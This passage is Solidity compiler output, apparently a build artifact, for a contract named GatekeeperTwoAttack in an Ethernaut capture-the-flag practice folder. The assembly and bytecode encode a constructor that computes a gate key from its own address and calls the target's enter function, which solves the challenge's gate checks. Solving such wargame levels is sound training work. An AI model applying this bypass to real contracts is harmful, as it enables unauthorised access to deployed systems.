*/\n  0x01\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":423:424  0 */\n  0x00\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":416:429  uint64(0) - 1 */\n  sub\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":404:408  this */\n  address\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":387:409  abi.encodePacked(this) */\n  add(0x20, mload(0x40))\n  dup1\n  dup3\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x60\n  shl\n  dup2\n  mstore\n  0x14\n  add\n  swap2\n  pop\n  pop\n  mload(0x40)\n    /* \"--CODEGEN--\":49:53   */\n  0x20\n    /* \"--CODEGEN--\":39:46   */\n  dup2\n    /* \"--CODEGEN--\":30:37   */\n  dup4\n    /* \"--CODEGEN--\":26:47   */\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  sub\n    /* \"--CODEGEN--\":13:20   */\n  dup2\n    /* \"--CODEGEN--\":6:55   */\n  mstore\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":387:409  abi.encodePacked(this) */\n  swap1\n  0x40\n  mstore\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":377:410  keccak256(abi.encodePacked(this)) */\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  keccak256\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":363:412  uint64(bytes8(keccak256(abi.encodePacked(this)))) */\n  0xc0\n  shr\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":363:430  uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1) */\n  xor\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":343:440  bytes8(... */\n  0xc0\n  shl\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":326:440  bytes8 gateKey = bytes8(... */\n  swap1\n  pop\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":537:543  target */\n  0x00\n  dup1\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":537:549  target.enter */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x3370204e\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":550:557  gateKey */\n  dup3\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":537:558  target.enter(gateKey) */\n  mload(0x40)\n  dup3\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  dup1\n  dup3\n  not(0xffffffffffffffffffffffffffffffffffffffffffffffff)\n  and\n  not(0xffffffffffffffffffffffffffffffffffffffffffffffff)\n  and\n  dup2\n  mstore\n  0x20\n  add\n  swap2\n  pop\n  pop\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  0x00\n  dup8\n  dup1\n  extcodesize\n  iszero\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_5\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_5:\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":537:558  target.enter(gateKey) */\n  pop\n  gas\n  call\n  iszero\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_7\n  jumpi\n    /* \"--CODEGEN--\":45:61   */\n  returndatasize\n    /* \"--CODEGEN--\":42:43   */\n  0x00\n    /* \"--CODEGEN--\":39:40   */\n  dup1\n    /* \"--CODEGEN--\":24:62   */\n  returndatacopy\n    /* \"--CODEGEN--\":77:93   */\n  returndatasize\n    /* \"--CODEGEN--\":74:75   */\n  0x00\n    /* \"--CODEGEN--\":67:94   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_7:\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":537:558  target.enter(gateKey) */\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n    /* \"--CODEGEN--\":15:17   */\n  0x20\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_8\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_8:\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":537:558  target.enter(gateKey) */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":528:534  result */\n  0x00\n  0x14\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":528:558  result = target.enter(gateKey) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":174:565  constructor(address _address) public {... */\n  pop\n  pop\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":88:567  contract GatekeeperTwoAttack {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":88:567  contract GatekeeperTwoAttack {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":88:567  contract GatekeeperTwoAttack {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x65372147\n      eq\n      tag_3\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":149:167  bool public result */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_5:\n      0x00\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220f5a9fb561acf16dd7f28698cfcbd627463a35de96a4df72e08963baf1e2f11d864736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060405161028e38038061028e8339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000600160000330604051602001808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660601b81526014019150506040516020818303038152906040528051906020012060c01c1860c01b90506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633370204e826040518263ffffffff1660e01b8152600401808277ffffffffffffffffffffffffffffffffffffffffffffffff191677ffffffffffffffffffffffffffffffffffffffffffffffff19168152602001915050602060405180830381600087803b15801561019457600080fd5b505af11580156101a8573d6000803e3d6000fd5b505050506040513d60208110156101be57600080fd5b8101908080519060200190929190505050600060146101000a81548160ff02191690831515021790555050506096806101f86000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80636537214714602d575b600080fd5b6033604d565b604051808215151515815260200191505060405180910390f35b600060149054906101000a900460ff168156fea2646970667358221220f5a9fb561acf16dd7f28698cfcbd627463a35de96a4df72e08963baf1e2f11d864736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x28E CODESIZE SUB DUP1 PUSH2 0x28E DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SUB ADDRESS PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE PUSH1 0x14 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0xC0 SHR XOR PUSH1 0xC0 SHL SWAP1 POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3370204E DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x194 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1A8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1BE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x0 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP POP PUSH1 0x96 DUP1 PUSH2 0x1F8 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x65372147 EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x4D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CREATE2 0xA9 0xFB JUMP BYTE 0xCF AND 0xDD PUSH32 0x28698CFCBD627463A35DE96A4DF72E08963BAF1E2F11D864736F6C6343000606 STOP CALLER ",
							"sourceMap": "88:479:1:-:0;;;174:391;5:9:-1;2:2;;;27:1;24;17:12;2:2;174:391:1;;;;;;;;;;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;174:391:1;;;;;;;;;;;;;;;;244:8;221:6;;:32;;;;;;;;;;;;;;;;;;326:14;428:1;423;416:13;404:4;387:22;;;;;;;;;;;;;;;;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;387:22:1;;;377:33;;;;;;363:49;;:67;343:97;;326:114;;537:6;;;;;;;;;;;:12;;;550:7;537:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;537:21:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;537:21:1;;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;537:21:1;;;;;;;;;;;;;;;;528:6;;:30;;;;;;;;;;;;;;;;;;174:391;;88:479;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b506004361060285760003560e01c80636537214714602d575b600080fd5b6033604d565b604051808215151515815260200191505060405180910390f35b600060149054906101000a900460ff168156fea2646970667358221220f5a9fb561acf16dd7f28698cfcbd627463a35de96a4df72e08963baf1e2f11d864736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x65372147 EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x4D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CREATE2 0xA9 0xFB JUMP BYTE 0xCF AND 0xDD PUSH32 0x28698CFCBD627463A35DE96A4DF72E08963BAF1E2F11D864736F6C6343000606 STOP CALLER ",
							"sourceMap": "88:479:1:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;88:479:1;;;;;;;;;;;;;;;;12:1:-1;9;2:12;149:18:1;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "30000",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"result()": "1081"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 88,
									"end": 567,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 88,
									"end": 567,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 88,
									"end": 567,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 174,
									"end": 565,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "CODESIZE",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 174,
									"end": 565,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 15,
									"end": 17,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 10,
									"end": 13,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 7,
									"end": 18,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 31,
									"end": 32,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 28,
									"end": 29,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 21,
									"end": 33,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "tag",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 174,
									"end": 565,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 174,
									"end": 565,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 244,
									"end": 252,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 221,
									"end": 227,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 221,
									"end": 227,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 221,
									"end": 253,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 221,
									"end": 253,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 221,
									"end": 253,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 221,
									"end": 253,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 326,
									"end": 340,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 428,
									"end": 429,
									"name": "PUSH",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 423,
									"end": 424,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 416,
									"end": 429,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 404,
									"end": 408,
									"name": "ADDRESS",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 387,
									"end": 409,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 387,
									"end": 409,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 387,
									"end": 409,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 387,
									"end": 409,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "PUSH",
									"source": 1,
									"value": "60"
								},
								{
									"begin": 387,
									"end": 409,
									"name": "SHL",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "PUSH",
									"source": 1,
									"value": "14"
								},
								{
									"begin": 387,
									"end": 409,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 387,
									"end": 409,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 49,
									"end": 53,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 39,
									"end": 46,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 30,
									"end": 37,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 26,
									"end": 47,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": 13,
									"end": 20,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 6,
									"end": 55,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 387,
									"end": 409,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 387,
									"end": 409,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 377,
									"end": 410,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 377,
									"end": 410,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 377,
									"end": 410,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 377,
									"end": 410,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 377,
									"end": 410,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 377,
									"end": 410,
									"name": "KECCAK256",
									"source": 1
								},
								{
									"begin": 363,
									"end": 412,
									"name": "PUSH",
									"source": 1,
									"value": "C0"
								},
								{
									"begin": 363,
									"end": 412,
									"name": "SHR",
									"source": 1
								},
								{
									"begin": 363,
									"end": 430,
									"name": "XOR",
									"source": 1
								},
								{
									"begin": 343,
									"end": 440,
									"name": "PUSH",
									"source": 1,
									"value": "C0"
								},
								{
									"begin": 343,
									"end": 440,
									"name": "SHL",
									"source": 1
								},
								{
									"begin": 326,
									"end": 440,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 326,
									"end": 440,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 537,
									"end": 543,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 537,
									"end": 543,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 543,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 543,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 537,
									"end": 543,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 543,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 537,
									"end": 543,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 537,
									"end": 543,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 537,
									"end": 543,
									"name": "DIV",
									"source": 1
								},
								{
									"begin": 537,
									"end": 543,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 537,
									"end": 543,
									"name": "AND",
									"source": 1
